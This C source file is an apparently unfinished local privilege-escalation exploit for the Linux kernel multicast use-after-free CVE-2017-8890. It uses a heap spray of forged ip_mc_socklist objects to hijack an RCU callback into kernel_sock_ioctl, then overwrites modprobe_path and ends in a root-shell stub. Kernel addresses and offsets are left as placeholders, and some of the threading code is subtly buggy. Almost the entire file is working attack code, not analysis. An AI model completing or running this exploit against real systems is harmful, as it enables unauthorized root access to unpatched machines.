/*
 * use KERNEL_SOCK_IOCTL learned from https://github.com/hardenedlinux/offensive_poc/blob/master/CVE-2017-8890/CVE-2017-8890.c
 *
 * 使用与v0相同的方法, 改写内核中ip_mc_socklist对象的rcu.next, 使其指向用户空间的
 * 一个rcu_head结构, 然后调用其中的func成员.
 *
 * 使用pthread, 注意调用kernel_sock_ioctl时修改的是哪个线程的thread_info.addr_limit
 */
#define	_GNU_SOURCE
#include <netinet/ip.h>

#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <errno.h>
#include <unistd.h>
#include <sys/types.h>
#include <fcntl.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <arpa/inet.h>
#include <sys/syscall.h>
#include <sys/mman.h>
#include <pthread.h>

#define	__rcu

struct rcu_head {
	struct rcu_head *next;
	void (*func)(struct rcu_head *head);
};

struct ip_sf_socklist {
	unsigned int	sl_max;
	unsigned int	sl_count;
	struct rcu_head rcu;
	unsigned int	sl_addr[0];
};

struct ip_mc_socklist {
	struct ip_mc_socklist	*next;
	struct ip_mreqn		multi;
	unsigned int		sfmode;
	struct ip_sf_socklist	*sflist;
	struct rcu_head		rcu;
};

static struct rcu_head *user_next_rcu = 0x40000000;
#define KERNEL_SOCK_IOCTL `<todo>`
#define	KERNEL_SOCK_IOCTL_RET `<todo>`
/*
 * if KERNEL_SOCK_IOCTL start like this:
 *	push %rbp; sub %rsp, $0x10; mov (%rsp), %rbx; mov $0x8(%rsp), %r12; ...
 * ROP:
 *	pop %rbx; pop %rbx; pop %r12; leave; ret;
 * the first pop will take the saved-ip
 */
#define	SOCK_OP_OFFSET	`<todo>`
#define	SOCK_IOCTL_OFFSET `<todo>`
int pipes[2];
static int prepare(void)
{
	user_next_rcu = mmap(user_next_rcu, 4096, PROT_READ | PROT_WRITE,
				MAP_FIXED | MAP_ANON | MAP_PRIVATE,
				-1, 0);
	if (user_next_rcu == MAP_FAILED) {
		perror("mmap");
		return -1;
	}

	user_next_rcu->next = NULL;
	user_next_rcu->func = KERNEL_SOCK_IOCTL;

	char *fake_sock = (char *)&user_next_rcu->next;
	*(size_t *)(fake_sock+SOCK_OP_OFFSET) = fake_sock + 0x100;
	*(size_t *)(fake_sock+0x100+SOCK_IOCTL_OFFSET) = KERNEL_SOCK_IOCTL_RET;

	if (pipe(pipes))
		return -1;

	return 0;
}

int init_sendmsg_server(struct sockaddr_in *si, int port)
{
	int sock, err;

	sock = socket(AF_INET, SOCK_DGRAM, IPPROTO_UDP);
	if (sock == -1) {
		perror("socket");
		return -1;
	}

	memset(si, 0, sizeof(*si));
	si->sin_family = AF_INET;
	si->sin_port = htons(port);
	si->sin_addr.s_addr = htonl(INADDR_ANY);

	err = bind(sock, (struct sockaddr *)si, sizeof(*si));
	if (err == -1) {
		perror("bind");
		close(sock);
		return -1;
	}

	return sock;
}

int init_sendmsg_client(struct sockaddr_in *si, int port)
{
	int sock, err;

	sock = socket(AF_INET, SOCK_DGRAM, IPPROTO_UDP);
	if (sock == -1) {
		perror("socket");
		return -1;
	}

	memset(si, 0, sizeof(*si));
	si->sin_family = AF_INET;
	si->sin_port = htons(port);

	err = inet_aton("127.0.0.1", &si->sin_addr);
	if (err == -1) {
		perror("inet_aton");
		close(sock);
		return -1;
	}

	return sock;
}

int client_sendmsg(int sock, struct sockaddr_in *si, char *data, size_t len)
{
	int err;
	struct iovec iov;
	struct msghdr mh;

	memset(&iov, 0, sizeof(iov));
	memset(&mh, 0, sizeof(mh));

	iov.iov_base = data;
	iov.iov_len = len;

	mh.msg_name = si;
	mh.msg_namelen = sizeof(struct sockaddr);
	mh.msg_iov = &iov;
	mh.msg_iovlen = 1;
	mh.msg_control = data;
	mh.msg_controllen = len;

	return sendmsg(sock, &mh, 0);
}

#define	MODPROBE_PATH	`<todo>`
static int modify_done = 0;
static int modify_modprobe(void)
{
	if (write(pipes[1], `<todo>`, 8) == -1) {
		return -1;
	}
	if (read(pipes[0], MODPROBE_PATH, 8) == -1) {
		return -1;
	}

	return 0;
}

int spray_switch = 0;
void *spray0(void *arg)
{
	struct sockaddr_in sersi, clisi;
	int sfd, cfd;
	int port = (int)arg;

	sfd = init_sendmsg_server(&sersi, port);
	if (sfd == -1) {
		fprintf(stderr, "init_sendmsg_server err\n");
		return (void *)-1;
	}

	cfd = init_sendmsg_client(&clisi, port);
	if (cfd == -1) {
		fprintf(stderr, "init_sendmsg_client err\n");
		close(sfd);
		return (void *)-1;
	}

	size_t spray_len = sizeof(struct ip_mc_socklist);
	char buf[spray_len];
	memset(buf, 0, spray_len);
	struct ip_mc_socklist *fake_ml = (struct ip_mc_socklist *)buf;
	fake_ml->multi.imr_multiaddr.s_addr = inet_addr("224.0.0.0");
	fake_ml->multi.imr_ifindex = 1;
	fake_ml->rcu.next = 0x40000000;
	fake_ml->rcu.func = `<todo>`;	/* ip_mc_socklist_reclaim */

	while (!spray_switch)
		usleep(1000);

	while (spray_switch) {
		client_sendmsg(cfd, &clisi, buf, spray_len);
	}

	int err = modify_modprobe();
	if (err == -1)
		fprintf(stderr, "spray0 modify_modprobe err\n");
	else {
		fprintf(stderr, "spray0 modify_modprobe done\n");
		modify_done = 1;
	}
	sleep(9);
	close(sfd);
	close(cfd);
	return (void *)0;
}

int servfd;
struct sockaddr_in serv_addr;
static unsigned short port = 13579;
static int accept_times = 0x10;
static int spray_threads = 0x10;
static void do_child_connect(int times)
{
	int i = 0;
	int sockfd[times];

	struct sockaddr_in sai;
	memset(&sai, 0, sizeof(sai));
	sai.sin_family = AF_INET;
	sai.sin_port = htons(port);
	sai.sin_addr.s_addr = inet_addr("127.0.0.1");

	for (i = 0; i < times; i++) {
		sockfd[i] = socket(AF_INET, SOCK_STREAM, IPPROTO_IP);
		if (connect(sockfd[i],(struct sockaddr *)&sai,sizeof(sai)) == -1) {
			perror("connect");
			return -1;
		}
	}

	sleep(9);
}
static int do_it(void)
{
	int i = 0;
	memset(&serv_addr, 0, sizeof(serv_addr));
	serv_addr.sin_family = AF_INET;
	serv_addr.sin_port = htons(port);
	serv_addr.sin_addr.s_addr = inet_addr("127.0.0.1");

	struct group_req req;
	struct sockaddr_in sai;
	memset(&sai, 0, sizeof(sai));
	sai.sin_family = AF_INET;
	sai.sin_port = htons(port);
	sai.sin_addr.s_addr = inet_addr("224.0.0.0");
	req.gr_interface = 1;
	memcpy(&req.gr_group, &sai, sizeof(sai));

	pthread_t spray_thread[spray_threads];
	int spray_port = 54321;
	for (i = 0; i < spray_threads; i++) {
		pthread_create(&spray_thread, NULL, spray0, (void *)spray_port++);
	}

	servfd = socket(AF_INET, SOCK_STREAM, IPPROTO_IP);
	if (servfd == -1) {
		perror("socket");
		return -1;
	}

	if (setsockopt(servfd,SOL_IP,MCAST_JOIN_GROUP,&req,sizeof(req)) == -1) {
		perror("setsockopt");
		return -1;
	}

	bind(servfd, (struct sockaddr *)&serv_addr, sizeof(serv_addr));

	listen(servfd, accept_times);

	int child;
	int connfd[accept_times];
	if ((child = fork()) < 0) {
		perror("fork");
	} else if (child == 0) {
		close(servfd);
		do_child_connect(accept_times);
		exit(0);
	}

	for (i = 0; i < accept_times; i++) {
		connfd[i] = accept(servfd, NULL, NULL);
		if (connfd[i] == -1) {
			perror("accept");
			return -1;
		}
	}

	if (connfd[0])
		close(connfd[0]);

	usleep(30*1000);
	spray_switch = 1;

	for (i = 1; i < accept_times; i++) {
		close(connfd[i]);
		usleep(30*1000);
	}

	spray_switch = 0;
	usleep(10*1000);
	if (modify_done)
		fprintf(stderr, "modprobe modifed done\n");
	else {
		if (modify_modprobe() == -1)
			fprintf(stderr, "modprobe modifed failed\n");
		else {
			fprintf(stderr, "modprobe modifed done\n");
			modify_done = 1;
		}
	}

	return 0;
}

static int get_root_shell(void)
{
	`<todo>`
	return 0;
}

int main(int argc, char *argv[])
{
	int err;

	err = prepare();
	if (err) {
		fprintf(stderr, "prepare err\n");
		return -1;
	}

	err = do_it();
	if (err) {
		fprintf(stderr, "do_it err\n");
		return -1;
	}

	err = get_root_shell();
	if (err) {
		fprintf(stderr, "get_root_shell err\n");
		return -1;
	}

	getchar();

	return 0;
}
